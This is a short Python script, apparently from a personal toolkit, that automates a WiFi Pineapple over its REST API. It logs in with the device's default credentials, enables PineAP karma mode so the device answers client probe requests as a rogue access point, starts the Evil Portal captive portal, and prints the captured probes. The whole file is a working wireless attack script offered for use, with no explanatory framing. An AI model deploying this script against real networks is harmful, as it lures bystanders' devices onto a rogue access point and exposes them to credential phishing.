#!/usr/bin/env python3
# ~/hexbox/scripts/pineapple_auto.py
# Automates WiFi Pineapple via its REST API

import requests, json, sys
from pathlib import Path


def _load_config():
    cfg = Path(__file__).parent.parent / "config.json"
    if cfg.exists():
        with open(cfg) as f:
            d = json.load(f)
        p = d.get("devices", {}).get("pineapple", {})
        return (
            f"http://{p.get('ip', '172.16.42.1')}:{p.get('api_port', 1471)}",
            p.get("user", "root"),
            p.get("pass", "hak5pineapple"),
        )
    return "http://172.16.42.1:1471", "root", "hak5pineapple"


def login(base_url: str, user: str, passwd: str) -> str:
    try:
        r = requests.post(f"{base_url}/api/login",
                          json={"username": user, "password": passwd}, timeout=10)
        r.raise_for_status()
    except Exception as e:
        print(f"[ERR] Pineapple login failed: {e}", file=sys.stderr)
        sys.exit(1)
    token = r.json().get("token")
    if not token:
        print("[ERR] No token in login response — check credentials", file=sys.stderr)
        sys.exit(1)
    return token


def api(base_url: str, token: str, module: str, action: str, **kwargs) -> dict:
    try:
        r = requests.post(f"{base_url}/api/{module}/{action}",
                          headers={"Authorization": f"Bearer {token}"},
                          json=kwargs, timeout=10)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        print(f"[WARN] API {module}/{action} failed: {e}", file=sys.stderr)
        return {}


if __name__ == "__main__":
    base_url, user, passwd = _load_config()
    print(f"[*] Connecting to Pineapple at {base_url}")

    token = login(base_url, user, passwd)
    print("[+] Authenticated")

    api(base_url, token, "pineap", "start")
    api(base_url, token, "pineap", "settings",
        allow_associations=True,
        broadcast_ssid_pool=True,
        respond_to_probes=True,
        beacon_responses=True)
    print("[+] PineAP started (karma mode on)")

    api(base_url, token, "evilportal", "start", portal="default")
    print("[+] Evil Portal started")

    probes = api(base_url, token, "pineap", "probes")
    print("[+] Captured probes:")
    print(json.dumps(probes, indent=2))
